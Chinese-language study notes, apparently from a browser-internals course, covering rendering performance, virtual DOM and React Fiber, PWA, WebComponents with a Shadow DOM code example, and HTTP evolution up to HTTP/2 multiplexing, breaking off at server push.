![img](https://static001.geekbang.org/resource/image/36/87/36159f7081e37ce4714b20ce2630e987.png)

从上图可以看出，在 foo 函数内部重复执行计算样式和布局，这会大大影响当前函数的执行效率。这种情况的避免方式和强制同步布局一样，都是尽量不要在修改 DOM 结构时再去查询一些相关值。

4. 合理利用 CSS 合成动画

   合成动画是直接在合成线程上执行的，这和在主线程上执行的布局、绘制等操作不同，如果主线程被 JavaScript 或者一些布局任务占用，CSS 动画依然能继续执行。所以要尽量利用好 CSS 合成动画，如果能让 CSS 处理动画，就尽量交给 CSS 来操作。另外，如果能提前知道对某个元素执行动画操作，那就最好将其标记为 will-change，这是告诉渲染引擎需要将该元素单独生成一个图层。

5. 避免频繁的垃圾回收 JavaScript 使用了自动垃圾回收机制，如果在一些函数中频繁创建临时对象，那么垃圾回收器也会频繁地去执行垃圾回收策略。这样当垃圾回收操作发生时，就会占用主线程，从而影响到其他任务的执行，严重的话还会让用户产生掉帧、不流畅的感觉。所以要尽量避免产生那些临时垃圾数据。那该怎么做呢？可以尽可能优化储存结构，尽可能避免小颗粒对象的产生。

## 虚拟 DOM

虚拟 DOM 和实际的 DOM 有何不同？

### 真实 DOM 的缺陷

调用`document.body.appendChild(node)`往 body 节点上添加一个元素，调用该 API 之后会引发一系列的连锁反应。首先渲染引擎会将 node 节点添加到 body 节点之上，然后触发样式计算、布局、绘制、栅格化、合成等任务，我们把这一过程称为**重排**。

除了重排之外，还有可能引起**重绘**或者**合成**操作。另外，对于 DOM 的不当操作还有可能引发**强制同步布局**和**布局抖动**的问题，这些操作都会大大降低渲染效率。因此，对于 DOM 的操作我们时刻都需要非常小心谨慎。

对于一些复杂的页面或者目前使用非常多的单页应用来说，其 DOM 结构是非常复杂的，而且还需要不断地去修改 DOM 树，每次操作 DOM ，渲染引擎都需要进行重排、重绘或者合成等操作，因为 DOM 结构复杂，所生成的页面结构也会很复杂，对于这些复杂的页面，执行一次重排或者重绘操作都是非常耗时的，这就给我们带来了真正的性能问题。

所以我们需要有一种方式来减少 JavaScript 对 DOM 的操作，这时候虚拟 DOM 就上场了。

### 什么是虚拟 DOM

![image-20220513235215435](.\typora-user-images\image-20220513235215435.png)

### 虚拟 DOM 要解决哪些事情

- 将页面改变的内容应用到虚拟 DOM 上，而不是直接应用到 DOM 上。

- 变化被应用到虚拟 DOM 上时，虚拟 DOM 并不急着去渲染页面，而仅仅是调整虚拟 DOM 的内部状态，这样操作虚拟 DOM 的代价就变得非常轻了。

- 在虚拟 DOM 收集到足够的改变时，再把这些变化一次性应用到真实的 DOM 上。

**React 中的虚拟 DOM**

- **创建阶段**。首先依据 JSX 和基础数据创建出来虚拟 DOM，它反映了真实的 DOM 树的结构。然后由虚拟 DOM 树创建出真实 DOM 树，真实的 DOM 树生成完后，再触发渲染流水线往屏幕输出页面。
- **更新阶段**。如果数据发生了改变，那么就需要根据新的数据创建一个新的虚拟 DOM 树；然后 React 比较两个树，找出变化的地方，并把变化的地方一次性更新到真实的 DOM 树上；最后渲染引擎更新渲染流水线，并生成新的页面。

**React Fiber 更新机制**

当有数据更新时，React 会生成一个新的虚拟 DOM，然后拿新的虚拟 DOM 和之前的虚拟 DOM 进行比较，这个过程会找出变化的节点，然后再将变化的节点应用到 DOM 上。

重点关注下比较过程，最开始的时候，比较两个虚拟 DOM 的过程是在一个递归函数里执行的，其**核心算法是 reconciliation**。通常情况下，这个比较过程执行得很快，不过当虚拟 DOM 比较复杂的时候，执行比较函数就有可能占据主线程比较久的时间，这样就会导致其他任务的等待，造成页面卡顿。为了解决这个问题，React 团队重写了 reconciliation 算法，**新的算法称为 Fiber reconciler**，之前**老的算法称为 Stack reconciler**。

**协程的另外一个称呼就是 Fiber**，所以在这里可以把 Fiber 和协程关联起来，那么所谓的 Fiber reconciler，就是在执行算法的过程中出让主线程，这样就解决了 Stack reconciler 函数占用时间过久的问题。

**从双缓存和 MVC 模型这两个视角看虚拟 DOM**

### 双缓存

在开发游戏或者处理其他图像的过程中，屏幕从前缓冲区读取数据然后显示。但是很多图形操作都很复杂且需要大量的运算，比如一幅完整的画面，可能需要计算多次才能完成，如果每次计算完一部分图像，就将其写入缓冲区，那么就会造成一个后果，那就是在显示一个稍微复杂点的图像的过程中，你看到的页面效果可能是一部分一部分地显示出来，因此在刷新页面的过程中，会让用户感受到界面的闪烁。

而使用双缓存，可以让你先将计算的中间结果存放在另一个缓冲区中，等全部的计算结束，该缓冲区已经存储了完整的图形之后，再将该缓冲区的图形数据一次性复制到显示缓冲区，这样就使得整个图像的输出非常稳定。

在这里，你可以把虚拟 DOM 看成是 DOM 的一个 buffer，和图形显示一样，它会在完成一次完整的操作之后，再把结果应用到 DOM 上，这样就能减少一些不必要的更新，同时还能保证 DOM 的稳定输出。

### MVC 模式

虚拟 DOM 是一种类似双缓存的实现。

虚拟 DOM 在 MVC 模式中的作用。

MVC 能将数据和视图进行分离，在涉及到一些复杂的项目时，能够大大减轻项目的耦合度，使得程序易于维护。

![image-20220514000855662](.\typora-user-images\image-20220514000855662.png)

其**核心思想就是将数据和视图分离**，也就是说视图和模型之间是不允许直接通信的，它们之间的通信都是通过控制器来完成的。通常情况下的通信路径是视图发生了改变，然后通知控制器，控制器再根据情况判断是否需要更新模型数据。当然还可以根据不同的通信路径和控制器不同的实现方式，基于 MVC 又能衍生出很多其他的模式，如 MVP、MVVM 等，不过万变不离其宗，它们的基础骨架都是基于 MVC 而来。

所以在分析基于 React 或者 Vue 这些前端框架时，我们需要先重点把握大的 MVC 骨架结构，然后再重点查看通信方式和控制器的具体实现方式，这样我们就能从架构的视角来理解这些前端框架了。比如在分析 React 项目时，我们可以把 React 的部分看成是一个 MVC 中的视图，在项目中结合 Redux 就可以构建一个 MVC 的模型结构，如下图所示：

![image-20220514001117192](.\typora-user-images\image-20220514001117192.png)

在该图中，可以把虚拟 DOM 看成是 MVC 的视图部分，其控制器和模型都是由 Redux 提供的。其具体实现过程如下：

- 图中的控制器是用来监控 DOM 的变化，一旦 DOM 发生变化，控制器便会通知模型，让其更新数据；
- 模型数据更新好之后，控制器会通知视图，告诉它模型的数据发生了变化；
- 视图接收到更新消息之后，会根据模型所提供的数据来生成新的虚拟 DOM；
- 新的虚拟 DOM 生成好之后，就需要与之前的虚拟 DOM 进行比较，找出变化的节点；
- 比较出变化的节点之后，React 将变化的虚拟节点应用到 DOM 上，这样就会触发 DOM 节点的更新；
- DOM 节点的变化又会触发后续一系列渲染流水线的变化，从而实现页面的更新。

在实际工程项目中，你需要学会分析出这各个模块，并梳理出它们之间的通信关系，这样对于任何框架你都能轻松上手。

## 渐进式网页应用（PWA）

它究竟解决了 Web 应用的哪些问题？

Web 应用移动化是 Google 梦寐以求而又一直在发力的一件事，不过对于移动设备来说，前有本地 App，后有移动小程序，想要浏览器切入到移动端是相当困难的一件事，因为浏览器的运行性能是低于本地 App 的，并且 Google 也没有类似微信或者 Facebook 这种体量的用户群体。

什么是 PWA？PWA 又是以什么方式切入到移动端的呢？

PWA，全称是 Progressive Web App，翻译过来就是渐进式网页应用。“渐进式 +Web 应用”

对于 Web 应用很好理解了，就是目前我们普通的 Web 页面，所以 PWA 所支持的首先是一个 Web 页面。

“渐进式”，就需要从下面两个方面来理解：

- 站在 Web 应用开发者来说，PWA 提供了一个渐进式的过渡方案，让普通站点逐步过渡到 Web 应用。采取渐进式可以降低站点改造的代价，使得站点逐步支持各项新技术，而不是一步到位。
- 站在技术角度来说，PWA 技术也是一个渐进式的演化过程，在技术层面会一点点演进，比如逐渐提供更好的设备特性支持，不断优化更加流畅的动画效果，不断让页面的加载速度变得更快，不断实现本地应用的特性。

从这两点可以看出来，PWA 采取的是非常一个缓和的渐进式策略，不再像以前那样激进，动不动就是取代本地 App、取代小程序。与之相反，而是要充分发挥 Web 的优势，渐进式地缩短和本地应用或者小程序的距离。

、

## WebComponent

WebComponent 是一套技术的组合，能提供给开发者组件化开发的能力。

**什么是组件化？**

**对内高内聚，对外低耦合**。对内各个元素彼此紧密结合、相互依赖，对外和其他组件的联系最少且接口简单。

多人协作开发，每个人负责的组件需要尽可能独立完成自己的功能，其组件的内部状态不能影响到别人的组件，在需要和其他组件交互的地方得提前协商好接口。通过组件化可以降低整个系统的耦合度，同时也降低程序员之间沟通复杂度，让系统变得更加易于维护。

大部分语言都能实现组件化，归根结底在于编程语言特性，大多数语言都有自己的函数级作用域、块级作用域和类，可以将内部的状态数据隐藏在作用域之下或者对象的内部，这样外部就无法访问了，然后通过约定好的接口和外部进行通信。

JavaScript 虽然有不少缺点，但是作为一门编程语言，它也能很好地实现组件化，毕竟有自己的函数级作用域和块级作用域，所以封装内部状态数据并提供接口给外部都是没有问题的。

### 阻碍前端组件化的因素

- CSS 的全局属性会阻碍组件化
- DOM 也阻碍组件化

HTML 和 CSS 是如何阻碍前端组件化。

```html
<style>
  p {
    background-color: brown;
    color: cornsilk;
  }
</style>
<p>time.geekbang.org</p>
```

```html
<style>
p {
      background-color: red;
      color: blue
   }
<p>time.geekbang</p>
```

上面这两段代码分别实现了自己 p 标签的属性，如果两个人分别负责开发这两段代码的话，那么在测试阶段可能没有什么问题，不过当最终项目整合的时候，其中内部的 CSS 属性会影响到其他外部的 p 标签的，之所以会这样，是因为 CSS 是影响全局的。

渲染引擎会将所有的 CSS 内容解析为 CSSOM，在生成布局树的时候，会在 CSSOM 中为布局树中的元素查找样式，所以有两个相同标签最终所显示出来的效果是一样的，渲染引擎是不能为它们分别单独设置样式的。

在页面中只有一个 DOM，任何地方都可以直接读取和修改 DOM。所以使用 JavaScript 来实现组件化是没有问题的，但是 JavaScript 一旦遇上 CSS 和 DOM，那么就相当难办了。

### WebComponent 组件化开发

**CSS 和 DOM 是阻碍组件化的两个因素**，那要怎么解决?

WebComponent 给出了解决思路，它提供了对局部视图封装能力，可以让 DOM、CSSOM 和 JavaScript 运行在局部环境中，这样就使得局部的 CSS 和 DOM 不会影响到全局。

下面就结合具体代码来看看 WebComponent 是怎么实现组件化的：

WebComponent 是一套技术的组合，具体涉及到了**Custom elements（自定义元素）、Shadow DOM（影子 DOM）\*\*和\*\*HTML templates（HTML 模板）**，详细内容参考 MDN 上的[相关链接](https://developer.mozilla.org/zh-CN/docs/Web/Web_Components)。

要使用 WebComponent，通常要实现下面三个步骤：

- **首先，使用 template 属性来创建模板**。利用 DOM 可以查找到模板的内容，但是模板元素是不会被渲染到页面上的，也就是说 DOM 树中的 template 节点不会出现在布局树中，所以我们可以使用 template 来自定义一些基础的元素结构，这些基础的元素结构是可以被重复使用的。一般模板定义好之后，我们还需要在模板的内部定义样式信息。

- **需要创建一个 GeekBang 的类** 在该类的构造函数中要完成三件事：

  1. 查找模板内容；
  2. 创建影子 DOM；
  3. 再将模板添加到影子 DOM 上。

  影子 DOM 的作用是将模板中的内容与全局 DOM 和 CSS 进行隔离，这样我们就可以实现元素和样式的私有化了。你可以把影子 DOM 看成是一个作用域，其内部的样式和元素是不会影响到全局的样式和元素的，而在全局环境下，要访问影子 DOM 内部的样式或者元素也是需要通过约定好的接口的。

  影子 DOM，我们就实现了 CSS 和元素的封装，在创建好封装影子 DOM 的类之后，我们就可以**使用 customElements.define 来自定义元素了**

- **像正常使用 HTML 元素一样使用该元素**

下面我们就来演示下这 3 个技术是怎么实现数据封装的，如下面代码所示：

```html
<!DOCTYPE html>
<html>
  <body>
    <!--
            一：定义模板
            二：定义内部 CSS 样式
            三：定义 JavaScript 行为
    -->
    <template id="geekbang-t">
      <style>
        p {
          background-color: brown;
          color: cornsilk;
        }

        div {
          width: 200px;
          background-color: bisque;
          border: 3px solid chocolate;
          border-radius: 10px;
        }
      </style>
      <div>
        <p>time.geekbang.org</p>
        <p>time1.geekbang.org</p>
      </div>
      <script>
        function foo() {
          console.log('inner log');
        }
      </script>
    </template>
    <script>
      class GeekBang extends HTMLElement {
        constructor() {
          super();
          // 获取组件模板
          const content = document.querySelector('#geekbang-t').content;
          // 创建影子 DOM 节点
          const shadowDOM = this.attachShadow({ mode: 'open' });
          // 将模板添加到影子 DOM 上
          shadowDOM.appendChild(content.cloneNode(true));
        }
      }
      customElements.define('geek-bang', GeekBang);
    </script>

    <geek-bang></geek-bang>
    <div>
      <p>time.geekbang.org</p>
      <p>time1.geekbang.org</p>
    </div>
    <geek-bang></geek-bang>
  </body>
</html>
```

效果图：

![image-20220514004611883](.\typora-user-images\image-20220514004611883.png)

从图中我们可以看出，影子 DOM 内部的样式是不会影响到全局 CSSOM 的。另外，使用 DOM 接口也是无法直接查询到影子 DOM 内部元素的，比如你可以使用`document.getElementsByTagName('div')`来查找所有 div 元素，这时候你会发现影子 DOM 内部的元素都是无法查找的，因为要想查找影子 DOM 内部的元素需要专门的接口，所以通过这种方式又将影子内部的 DOM 和外部的 DOM 进行了隔离。

通过影子 DOM 可以隔离 CSS 和 DOM，不过需要注意一点，影子 DOM 的 JavaScript 脚本是不会被隔离的，比如在影子 DOM 定义的 JavaScript 函数依然可以被外部访问，这是因为 JavaScript 语言本身已经可以很好地实现组件化了。

### 浏览器如何实现影子 DOM

影子 DOM 的作用主要有以下两点：

1. 影子 DOM 中的元素对于整个网页是不可见的；
2. 影子 DOM 的 CSS 不会影响到整个网页的 CSSOM，影子 DOM 内部的 CSS 只对内部的元素起作用。

那么浏览器是如何实现影子 DOM 的呢？下面我们就来分析下，如下图：

![image-20220514004822134](.\typora-user-images\image-20220514004822134.png)

该图是上面那段示例代码对应的 DOM 结构图，从图中可以看出，我们使用了两次 geek-bang 属性，那么就会生成两个影子 DOM，并且每个影子 DOM 都有一个 shadow root 的根节点，我们可以将要展示的样式或者元素添加到影子 DOM 的根节点上，每个影子 DOM 你都可以看成是一个独立的 DOM，它有自己的样式、自己的属性，内部样式不会影响到外部样式，外部样式也不会影响到内部样式。

浏览器为了实现影子 DOM 的特性，在代码内部做了大量的条件判断，比如当通过 DOM 接口去查找元素时，渲染引擎会去判断 geek-bang 属性下面的 shadow-root 元素是否是影子 DOM，如果是影子 DOM，那么就直接跳过 shadow-root 元素的查询操作。所以这样通过 DOM API 就无法直接查询到影子 DOM 的内部元素了。

另外，当生成布局树的时候，渲染引擎也会判断 geek-bang 属性下面的 shadow-root 元素是否是影子 DOM，如果是，那么在影子 DOM 内部元素的节点选择 CSS 样式的时候，会直接使用影子 DOM 内部的 CSS 属性。所以这样最终渲染出来的效果就是影子 DOM 内部定义的样式。

问：你是怎么看待 WebComponents 和前端框架（React、Vue）之间的关系的？

## HTTP 及其性能优化

学习 HTTP 发展史，各个版本在发展过程中遇到的瓶颈和对应的解决方法。

### HTTP/0.9

91 年提出，主要用于学术交流。

**需求**：用来在网络之间**只传递**体积很小的 HTML 超文本内容。它采用了基于请求响应的模式，从客户端发出请求，服务器返回数据。

HTTP/0.9 的一个完整的请求流程：

- 客户端先根据 IP 地址、端口和服务器三次握手建立 TCP 连接。
- 建立好连接之后，**只会**发送一个 **GET 请求行**的信息，如 GET /index.html 用来获取 index.html。
- 服务器接收请求信息之后，读取对应的 HTML 文件，并将数据以 **ASCII 字符流**返回给客户端。
- HTML 文档传输完成后，断开连接。

![img](https://static001.geekbang.org/resource/image/db/34/db1166c68c22a45c9858e88a234f1a34.png)

HTTP/0.9 的实现有以下三个特点：

- **只有一个请求行**，没有请求头和请求体，因为只需要一个请求行就可以完整表达客户端的需求。

- 服务器**没有响应头**信息，因为服务器端并不需要告诉客户端太多信息，**只需要返回数据**。

- 返回的文件内容是以 ASCII 字符流来传输的，因为都是 HTML 格式的文件，所以使用 ASCII 字节码来传输。

http0.9 能满足当时的需求，但是 94 年大众可以通过拨号上网，同时网景浏览器的推出，让万维网进入大众视野，又有了新的需求，而 HTTP/0.9 已经不能适用，这就是 HTTP/1.0 诞生的原因。

**哪些新需求？**

- 浏览器中展示的不单是 **HTML 文件**，还包括 **JavaScript、CSS、图片、音频、视频**等**不同类型的文件**。需要支持多种类型的文件
- **文件格式不仅仅局限于 ASCII 编码**，还有很多其他类型编码的文件

### HTTP/1.0

**如何实现多种类型文件的下载？**

HTTP/1.0 引入请求头和响应头，它们都是以为 Key-Value 形式保存的，在 HTTP 发送请求时，会带上请求头信息，服务器返回数据时，会先返回响应头信息。 HTTP/1.0 具体的请求流程：

![img](https://static001.geekbang.org/resource/image/b5/7d/b52b0d1a26ff2b8607c08e5c50ae687d.png)

**怎么通过请求头和响应头来支持多种不同类型的数据？**

要支持多种类型的文件，就需要解决以下几个问题：

- 浏览器需要知道**服务器返回的数据是什么类型**，然后浏览器才能根据不同的数据类型做针对性的处理。
- 单个文件的数据量也变得越来越大。为了减轻传输性能，服务器会对数据进行压缩后再传输，所以浏览器需要知道**服务器压缩的方法**。
- 服务器需要对不同的地区提供不同的语言版本，这就需要浏览器告诉服务器它想要什么语言版本的页面（国际化）。
- 由于增加了各种不同类型的文件，而每种文件的编码形式又可能不一样，为了能够准确地读取文件，**浏览器需要知道文件的编码类型**。

在发起请求时候会通过 HTTP 请求头告诉服务器它期待服务器返回什么类型的文件、采取什么形式的压缩、提供什么语言的文件以及文件的具体编码。最终发送出来的请求头内容如下：

```http
accept: text/html     // 期望服务器返回 html 类型的文件
accept-encoding: gzip, deflate, br    // 接受服务器可以采用 gzip、deflate 或者 br 其中的一种压缩方式
accept-Charset: ISO-8859-1,utf-8   // 期望返回的文件编码是 UTF-8 或者 ISO-8859-1
accept-language: zh-CN,zh    // 期望页面的优先语言是中文
```

服务器接收到浏览器发送过来的请求头信息之后，会根据请求头的信息来准备响应数据。如果浏览器请求的压缩类型是 gzip，但是服务器不支持 gzip，只支持 br 压缩，那么它会通过响应头中的 content-encoding 字段告诉浏览器最终的压缩类型，也就是说**最终浏览器需要根据响应头的信息来处理数据**。下面是一段响应头的数据信息：

```http
content-encoding: br    // 表示服务器采用了 br 的压缩方法
content-type: text/html; charset=UTF-8    //表示服务器返回的是 html 文件，并且该文件的编码类型是 UTF-8
```

有了响应头的信息，浏览器就会使用 br 方法来解压文件，再按照 UTF-8 的编码格式来处理原始文件，最后按照 HTML 的方式来解析该文件。**这就是 HTTP/1.0 支持多文件的一个基本的处理流程**。

#### **HTTP/1.0 的其他特性**

有的请求服务器可能无法处理，或者处理出错，需要告诉浏览器服务器最终处理该请求的情况，这就引入了**状态码**。状态码是通过**响应行**的方式来通知浏览器的。

为了减轻服务器的压力，在 HTTP/1.0 中提供了 **Cache 机制**，用来缓存已经下载过的数据。

服务器需要统计客户端的基础信息，比如 Windows 和 macOS 的用户数量分别是多少，所以 HTTP/1.0 的请求头中还加入了**用户代理**的字段。

#### HTTP/1.0 的问题

1. **每个 HTTP 请求都伴随一个一次完整的 TCP 连接的建立到断开**

HTTP/1.0 每进行一次 HTTP 通信，都需要经历建立 TCP 连接、传输 HTTP 数据和断开 TCP 连接三个阶段（如下图）。

![img](https://static001.geekbang.org/resource/image/cc/7d/cccc9faf6d0addea8e1bf307cd7d8d7d.png)

在当时，由于通信的文件比较小，而且每个页面的引用也不多。但是随着浏览器普及，单个页面中的图片文件越来越多，有时候一个页面可能包含了几百个外部引用的资源文件，如果在下载每个文件的时候，都需要经历建立 TCP 连接、传输数据和断开连接这样的步骤，无疑会增加大量无谓的开销。

2. **每个域名绑定了一个唯一的 IP 地址，因此一个服务主机器只能支持一个域名**
3. 在设计 HTTP/1.0 时，**需要在响应头中设置完整的数据大小，如 Content-Length: 901，这样浏览器就可以根据设置的数据大小来接收数据。**

### HTTP/1.1

HTTP/1.1 引入了持久连接， Cookie、虚拟主机的支持、对动态内容的支持等特性。

#### 持久连接

HTTP/1.1 中增加了持久连接，它的特点是在**一个 TCP 连接上可以传输多个 HTTP 请求**，只要浏览器或者服务器没有明确断开连接，那么该 TCP 连接会一直保持。

![img](https://static001.geekbang.org/resource/image/80/1a/80b57830e15faa17631bea74054a0e1a.png)

HTTP 的持久连接可以有效减少 TCP 建立连接和断开连接的次数，这样的好处是减少了服务器额外的负担，并提升整体 HTTP 的请求时长。

持久连接在 HTTP/1.1 中是默认开启的，所以不需要专门为了持久连接去 HTTP 请求头设置信息，如果不想要采用持久连接，可以在 HTTP 请求头中加上 Connection: close。

**目前浏览器中对于同一个域名，默认允许同时建立 6 个 TCP 持久连接。**

#### 持久连接的不足

持久连接虽然能减少 TCP 的建立和断开次数，但是它需要等待前面的请求返回之后，才能进行下一次请求。如果 TCP 通道中的某个请求因为某些原因没有及时返回，那么就会阻塞后面的所有请求，这就是**队头阻塞**。

HTTP/1.1 中试图通过**管线化**的技术来解决队头阻塞的问题。

HTTP/1.1 中的管线化是指**将多个 HTTP 请求整批提交给服务器的技术**，**虽然可以整批发送请求，不过服务器依然需要根据请求顺序来回复浏览器的请求**。

FireFox、Chrome 都做过管线化的试验，但是由于各种原因，它们最终都放弃了管线化技术。

#### 提供虚拟主机的支持

随着虚拟主机技术的发展，需要实现在一台物理主机上绑定多个虚拟主机，每个虚拟主机都有自己的单独的域名，这些单独的域名都公用同一个 IP 地址。

因此，HTTP/1.1 的请求头中增加了 **Host 字段**，用来表示当前的域名地址，这样服务器就可以根据不同的 Host 值做不同的处理。

#### 对动态生成的内容提供支持

随着服务器端的技术发展，很多页面的内容都是动态生成的，因此在传输数据之前并不知道最终的数据大小，这就导致了浏览器不知道何时会接收完所有的文件数据。

HTTP/1.1 通过引入 **Chunk transfer 机制**来解决这个问题，服务器会将数据分割成若干个数据块，每个数据块发送时会附上上个数据块的长度，最后使用一个零长度的块作为发送数据完成的标志。这样就提供了对动态内容的支持。

#### 客户端 Cookie（在 http1.1 中引入）

#### 安全机制（在 http1.1 中引入）

**HTTP/1.1 还有哪些不足？**

1. HTTP 的对头阻塞问题

2. 文本传输效率问题而且不安全

3. header 中每次都传输类似头，增加了传输成本

4. http/1.1 中的一个 tcp 链接同一时刻只能处理一个 http 请求，在当前的请求没有结束之前，其他的请求只能处于阻塞状态

5. **HTTP/1.1 对带宽的利用率却并不理想**， 核心问题

   > 带宽是指每秒最大能发送或者接收的字节数。我们把每秒能发送的最大字节数称为上行带宽，每秒能够接收的最大字节数称为下行带宽。
   >
   > HTTP/1.1 很难将带宽用满。比如我们常说的 100M 带宽，实际的下载速度能达到 12.5M/S，而采用 HTTP/1.1 时，也许在加载页面资源时最大只能使用到 2.5M/S，很难将 12.5M 全部用满。

对于队头阻塞问题，只要传输层是 TCP，就不会得到根本上的解决， http/2 利用流的的机制很大程度的缓解了这个问题，http/3 传输层换成了 UDP 才彻底解决这个问题

### HTTP/2.0

**HTTP/1.1 最核心**的优化有三种方式：

- 增加了持久连接。
- 浏览器为**每个域名**最多同时维护 6 个 TCP 持久连接。
- 使用 CDN 实现域名分片机制。

域名分片:

![img](https://static001.geekbang.org/resource/image/91/c5/91c3e0a8f13ebc4d81f08d8604f770c5.png)

通过 CDN，同时为每个域名维护 6 个连接，大大减轻了整个资源的下载时间。如果使用单个 TCP 的持久连接，下载 100 个资源所花费的时间为 100 _ n _ RTT；若通过上面的技术，就可以把整个时间缩短为 100 _ n _ RTT/(6 \* CDN 个数)。

#### HTTP/1.1 的主要问题

**带宽的利用率**低，主要是由以下三个原因导致的。

1. **TCP 的慢启动。** 一旦一个 TCP 连接建立之后，就进入了发送数据状态，刚开始 TCP 协议会采用一个非常慢的速度去发送数据，然后慢慢加快发送数据的速度，直到发送数据的速度达到一个理想状态，这个过程称为慢启动。

   慢启动是 TCP 为了减少网络拥塞的一种策略，是没有办法改变的。

   **之所以说慢启动会带来性能问题，是因为页面中常用的一些关键资源文件本来就不大**，如 HTML 文件、CSS 文件和 JavaScript 文件，通常这些文件在 TCP 连接建立好之后就要发起请求的，但这个过程是慢启动，所以耗费的时间比正常的时间要多很多，这样就推迟了首次渲染页面的时长。

2. **同时开启了多条 TCP 连接，那么这些连接会竞争固定的带宽。** 系统同时建立了多条 TCP 连接，当带宽充足时，每条连接发送或者接收速度会慢慢向上增加；而一旦带宽不足时，这些 TCP 连接又会减慢发送或者接收的速度。比如一个页面有 200 个文件，使用了 3 个 CDN，那么加载该网页的时候就需要建立 6 \* 3，也就是 18 个 TCP 连接来下载资源；在下载过程中，当发现带宽不足的时候，各个 TCP 连接就需要动态减慢接收数据的速度。

   这样就会出现一个问题，因为**有的 TCP 连接下载的是一些关键资源，如 CSS 文件、JavaScript 文件等，而有的 TCP 连接下载的是图片、视频等普通的资源文件，但是多条 TCP 连接之间又不能协商让哪些关键资源优先下载，这样就有可能影响那些关键资源的下载速度。**

3. **HTTP/1.1 队头阻塞的问题。** HTTP/1.1 中使用持久连接时，虽然能公用一个 TCP 管道，但是在一个管道中同一时刻只能处理一个请求，在当前的请求没有结束之前，其他的请求只能处于阻塞状态。这意味着我们不能随意在一个管道中发送请求和接收内容。

   阻塞请求的因素有很多，并且都是一些不确定性的因素，假如有的请求被阻塞了 5 秒，那么后续排队的请求都要延迟等待 5 秒，在这个等待的过程中，带宽、CPU 都被白白浪费。

   在浏览器处理生成页面的过程中，是非常希望能提前接收到数据的，这样就可以对这些数据做预处理操作，比如提前接收到了图片，那么就可以提前进行编解码操作，等到需要使用该图片的时候，就可以直接给出处理后的数据了，这样能让用户感受到整体速度的提升。

   但队头阻塞使得这些数据不能并行请求，所以队头阻塞是很不利于浏览器优化的。

4. 应用层对头阻塞问题，HTTP/1.1 中使用持久连接时，虽然能公用一个 TCP 管道，但是**在一个管道中同一时刻只能处理一个请求**，在当前的请求没有结束之前，其他的请求只能处于阻塞状态。这意味着我们不能随意在一个管道中发送请求和接收内容。

   因为阻塞请求的因素有很多，并且都是一些不确定性的因素，假如有的请求被阻塞了 5 秒，那么后续排队的请求都要延迟等待 5 秒，在这个等待的过程中，带宽、CPU 都被白白浪费了。

   在浏览器处理生成页面的过程中，是非常希望能提前接收到数据的，这样就可以对这些数据做预处理操作，比如提前接收到了图片，那么就可以提前进行编解码操作，等到需要使用该图片的时候，就可以直接给出处理后的数据了，这样能让用户感受到整体速度的提升。但队头阻塞使得这些数据不能并行请求，所以队头阻塞是很不利于浏览器优化的。

**HTTP/1.1 所存在的一些主要问题：慢启动和 TCP 连接之间相互竞争带宽是由于 TCP 本身的机制导致的，而队头阻塞是由于 HTTP/1.1 的机制导致的。**

#### HTTP/2 的解决办法

规避 TCP 的慢启动和 TCP 连接之间的竞争问题。

##### 多路复用

HTTP/2 的思路就是**一个域名**只使用**一个 TCP 长连接**来传输数据，这样整个页面资源的下载过程**只需要一次慢启动**，同时**也避免了多个 TCP 连接竞争带宽**所带来的问题。

队头阻塞的问题，等待请求完成后才能去请求下一个资源，这种方式无疑是最慢的，HTTP/2 需要实现**资源的并行请求**，也就是任何时候都可以将请求发送给服务器，而并不需要等待其他请求的完成，然后服务器也可以随时返回处理好的请求资源给浏览器。

**多路复用机制**，HTTP/2 的解决方案可以参考下图：

![img](https://static001.geekbang.org/resource/image/0a/00/0a990f86ad9c19fd7d7620b2ef7ee900.jpg)

**每个请求（不是数据包层面的）**都有一个对应的 ID，如 stream1 表示 index.html 的请求，stream2 表示 foo.css 的请求。这样在浏览器端，就可以随时将请求发送给服务器了。

服务器端接收到这些请求后，会根据自己的喜好来决定优先返回哪些内容。之所以可以随意发送，是因为每份数据都有对应的 ID，浏览器接收到之后，会筛选出相同 ID 的内容，将其**拼接为完整的 HTTP 响应数据**。

**HTTP/2 使用了多路复用技术，可以将请求分成一帧一帧的数据去传输，这样带来了一个额外的好处，就是当收到一个优先级高的请求时，比如接收到 JavaScript 或者 CSS 关键资源的请求，服务器可以暂停之前的请求来优先处理关键资源的请求。**

##### 多路复用的实现

![img](https://static001.geekbang.org/resource/image/86/6a/86cdf01a3af7f4f755d28917e58aae6a.png)

HTTP/2 添加了一个**二进制分帧层**，HTTP/2 的请求和接收过程：

- 首先，浏览器准备好请求数据，包括了请求行、请求头等信息，如果是 POST 方法，那么还要有请求体。
- **一条请求的这些数据经过二进制分帧层处理之后，会被转换为一个个带有请求 ID 编号的帧，通过协议栈将这些帧发送给服务器。**
- **服务器接收到所有帧之后，会将所有相同 ID 的帧合并为一条完整的请求信息。**
- 然后服务器处理该条请求，并将处理的**响应行、响应头和响应体分别发送至二进制分帧层**。
- 同样，二进制分帧层会将这些响应数据转换为一个个带有响应 ID 编号的帧，经过协议栈发送给浏览器。
- 浏览器接收到响应帧之后，会**根据 ID 编号将帧的数据提交给对应的请求**。

从上面的流程可以看出，**通过引入二进制分帧层，就实现了 HTTP 的多路复用技术**。

HTTP/2 引入了二进制分帧层，不过 HTTP/2 的语义和 HTTP/1.1 依然是一样的，也就是说它们通信的语言并没有改变，比如开发者依然可以通过 Accept 请求头告诉服务器希望接收到什么类型的文件，依然可以使用 Cookie 来保持登录状态，依然可以使用 Cache 来缓存本地文件，这些都没有变，发生改变的只是传输方式。这一点对开发者来说尤为重要，这意味着不需要为 HTTP/2 去重建生态，并且 HTTP/2 推广起来会也相对更轻松。

##### HTTP/2 其他特性

**多路复用**是 HTTP/2 的最核心功能，它能实现资源的并行传输。多路复用技术是建立在二进制分帧层的基础之上。其实基于二进制分帧层，HTTP/2 还附带实现了很多其他功能：

###### 1. 可以设置请求的优先级

浏览器中有些数据是非常重要的，但是在发送请求时，重要的请求可能会晚于那些不怎么重要的请求，如果服务器按照请求的顺序来回复数据，那么这个重要的数据就有可能推迟很久才能送达浏览器。

为了解决这个问题，HTTP/2 提供了请求优先级，可以**在发送请求时，标上该请求的优先级**，这样服务器接收到请求之后，会优先处理优先级高的请求。

###### 2. 服务器推送

